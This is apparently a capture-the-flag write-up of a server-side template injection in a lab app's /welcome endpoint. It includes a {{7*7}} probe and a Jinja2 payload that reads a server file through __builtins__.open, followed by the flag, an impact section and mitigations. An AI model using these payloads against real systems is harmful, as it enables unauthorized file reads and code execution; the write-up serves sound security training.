# Writeup - Welcome Card

---

## Challenge Name / Title

**Welcome Card**

---

## Vulnerability Identified

**Server-Side Template Injection (SSTI)**

The `/welcome` endpoint accepts a `name` GET parameter and reflects it in a personalized welcome message. During testing, I submitted `{{7*7}}` as the name value. Instead of displaying the literal string, the page rendered `49`  confirming that the input was being evaluated as a Jinja2 template expression on the server. This is a Server-Side Template Injection vulnerability.

---

## Exploitation Steps / Description

**Step 1:** No authentication is required. First, confirm SSTI by visiting:
```
http://localhost:3000/welcome?name={{7*7}}
```
Page renders `49` — template evaluation confirmed.

**Step 2:** Open Burp Suite → Repeater and send the full exploit payload:

```http
GET /welcome?name=%7B%7Brequest.application.__globals__.__builtins__.open('/app/data/flag_ssti.txt').read()%7D%7D HTTP/1.1
Host: localhost:3000
Connection: close

```

The `name` parameter URL-decodes to:
```
{{request.application.__globals__.__builtins__.open('/app/data/flag_ssti.txt').read()}}
```

**Step 3:** The Jinja2 template engine evaluates the expression, opens the file, reads its contents, and returns it in the response body in place of the name.

**Step 4:** The server returns `200 OK` and the flag is displayed in the welcome message.

---


## Flag Obtained

```
FLAG{ssti_9c079d89}
```

---

## Impact

In a real banking application, SSTI leads to full Remote Code Execution (RCE) on the server with no authentication required. An attacker can:
- Read arbitrary server files including private keys, certificates, and config files
- Execute system-level commands to take complete control of the server
- Dump environment variables containing database passwords and API secrets
- Use the compromised server as a launchpad to attack internal systems

This is a **Critical** severity vulnerability with maximum impact on Confidentiality, Integrity, and Availability.

---

## Mitigation / Remediation

1. **Use Static Templates:** Never concatenate user input directly into a template string. Use `render_template()` with a pre-defined static template file and pass user data as a context variable.
2. **Sandbox the Engine:** Use Jinja2's `SandboxedEnvironment` if dynamic templates are required.
3. **Input Validation:** Validate the `name` parameter to only allow plain alphanumeric characters.
4. **Output Encoding:** Always apply appropriate output encoding when reflecting user input in HTML responses.
